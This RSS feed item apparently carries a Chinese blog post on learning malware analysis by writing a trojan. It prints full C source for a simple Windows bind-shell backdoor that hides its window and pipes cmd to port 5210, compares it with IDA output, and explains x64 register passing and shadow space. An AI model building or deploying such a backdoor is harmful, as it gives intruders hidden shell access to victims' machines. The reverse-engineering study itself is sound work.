      <link>https://wander1ng.com/post/%E4%BB%8E%E6%AD%A3%E5%90%91%E6%9C%A8%E9%A9%AC%E7%BC%96%E5%86%99%E7%9C%8B%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/</link>
      <pubDate>Thu, 26 Nov 2020 20:11:59 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E4%BB%8E%E6%AD%A3%E5%90%91%E6%9C%A8%E9%A9%AC%E7%BC%96%E5%86%99%E7%9C%8B%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/</guid>
      <description>&lt;p&gt;​	提高样本分析能力，最重要的事情之一就是先正向编写木马。之前简单编译过一个程序，今天搜了一个非常简单的后门，比较一下反编译的结果和源码的区别。&lt;/p&gt;
&lt;p&gt;​	源码如下。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#pragma comment(lib,&amp;#34;ws2_32.lib&amp;#34;)  //这里我们静态加入一个lib文件，也就是ws2_32.lib&amp;lt;/font&amp;gt;

#pragma comment(linker,&amp;#34;/subsystem:\&amp;#34;windows\&amp;#34;/entry:\&amp;#34;mainCRTStartup\&amp;#34;&amp;#34;) //设置连接器选项

#include &amp;lt;winsock2.h&amp;gt; //包含头文件winsock2.h,这个是 windows socket的头文件

#include &amp;lt;windows.h&amp;gt; //常用的，不解释

#define MasterPort 5210 //定义一个常量，也就是我们后面要打开的端口

main()   //主函数不解释
{
  WSADATA WSADa; //这个结构被用来存储被WSAStartup函数调用后返回的Windows Sockets数据。后面的基本上差不多就不解释，不懂请大家自行百度
  sockaddr_in SockAddrIn; 
  SOCKET CSocket,SSocket;
  int iAddrSize;
  PROCESS_INFORMATION ProcessInfo;
  STARTUPINFO StartupInfo;
  char szCMDPath[255];
  
  //分配内存，初始化数据
  ZeroMemory(&amp;amp;ProcessInfo,sizeof(PROCESS_INFORMATION));
  ZeroMemory(&amp;amp;StartupInfo,sizeof(STARTUPINFO));
  ZeroMemory(&amp;amp;WSADa,sizeof(WSADATA));

  //获取cmd路径
  GetEnvironmentVariable(&amp;#34;COMSPEG&amp;#34;,szCMDPath,sizeof(szCMDPath));

  //加载ws2_32.dll
  WSAStartup(0x0202,&amp;amp;WSADa);

  //设置本地信息和绑定协议,建立socket,代码如下:
  SockAddrIn.sin_family = AF_INET;
  SockAddrIn.sin_addr.s_addr = INADDR_ANY;
  SockAddrIn.sin_port = htons(MasterPort);
  CSocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);

  //设置绑定端口，将SockAddrIn绑定到CSocket。
  bind(CSocket,(sockaddr *)&amp;amp;SockAddrIn,sizeof(SockAddrIn));

  //设置服务器端监听端口
  listen(CSocket,1);
  iAddrSize = sizeof(SockAddrIn);

  //开始连接远程服务器，并配置隐藏窗口结构体
  SSocket = accept(CSocket,(sockaddr *)&amp;amp;SockAddrIn,&amp;amp;iAddrSize);

  StartupInfo.cb = sizeof(STARTUPINFO);

  StartupInfo.wShowWindow = SW_HIDE;
  
  StartupInfo.dwFlags = STARTF_USESTDHANDLES |

  STARTF_USESHOWWINDOW;

  StartupInfo.hStdInput = (HANDLE)SSocket;

  StartupInfo.hStdOutput = (HANDLE)SSocket;

  StartupInfo.hStdError = (HANDLE)SSocket;
  
  //创建匿名管道：

  CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &amp;amp;StartupInfo, &amp;amp;ProcessInfo);

  WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

  CloseHandle(ProcessInfo.hProcess);

  CloseHandle(ProcessInfo.hThread);

 

  //关闭进程句柄：

  closesocket(CSocket);

  closesocket(SSocket);

  WSACleanup();

    //关闭连接卸载ws2_32.dll

  return 0;

  }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;实际IDA反编译出来的效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/14579c8d6365d8c8ebbc49c59bfc8563.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到反编译的结果，库的导入和局部变量的定义是没有的，应该是编译过程中，在链接操作之前这些就已经执行完成了。&lt;/p&gt;
&lt;p&gt;简单来说这个程序的功能就是开放5210端口，并监听。然后把输入重定向到新起cmd进程，并把cmd进程的输出重定向到5210端口。&lt;/p&gt;
&lt;h5 id=&#34;对64位下传参的测试&#34;&gt;对64位下传参的测试&lt;/h5&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/4df417ee0c925a50506052e490c72dfa.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;传4个参数及以下，使用的是寄存器传参，cd89，第一个参数传到c，第二个参数传到d，第三个参数传到8，第四个参数传到9。从顺序上来看，从右往左，先从第四个开始传，再从第三个开始传&amp;hellip;(最后三句汇编)。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/7cfa50c168c605c3f3c348bc87cc3891.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;传5个参数及以上，前四个使用寄存器传参，从第五个开始使用堆栈传参(上图是传完了之后的结果，汇编侧可以看到寄存器的使用)。可以看到第五个参数先使用了寄存器将参数从rbp-14h中取出来(寻址方式。反映变化趋势的方面，栈由高地址向低地址生长，参数由低地址向高地址生长。x64dbg的上面是栈顶低地址下面是栈底高地址)。rbp-14h=DCC，实际上一个堆栈存放一段数据，可能是一个参数也可能是两个参数？例如DD0处存放了00000002和00000003。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/d8c9290af6a1335497314da67801034c.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后又赋给了rsp+20，最后把eax中存放的第一个参数赋给ecx。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;C:%5CUsers%5Clizhenxin%5CAppData%5CRoaming%5CLanxinSoftCustom%5CLxResource%5CImages%5C0880c08b0110ebe3d330.png&#34; alt=&#34;0880c08b0110ebe3d330&#34;&gt;&lt;/p&gt;
&lt;p&gt;比较奇怪的是为什么不在栈顶。&lt;/p&gt;
&lt;h2 id=&#34;栈传参--shadow-space影子空间&#34;&gt;栈传参 &amp;amp; Shadow Space（影子空间）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Windows 要求每个函数调用在栈上为前 4 个参数 &lt;strong&gt;预留 32 字节&lt;/strong&gt; 的空间，叫做 &lt;strong&gt;shadow space&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;不论是否用到了栈，这块空间都要保留（供被调用者在需要时将寄存器值保存到这里）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;📦 结构如下（函数调用前）：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;less复制编辑High address
+-------------------+
| 参数5（如有）       | ← 栈上传递
| 参数6（如有）       |
+-------------------+
| Shadow Space (32B)| ← 必须保留
| [RCX]             |
| [RDX]             |
| [R8]              |
| [R9]              |
+-------------------+
| Return Address    |
+-------------------+
Low address (RSP)
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
  </channel>
</rss>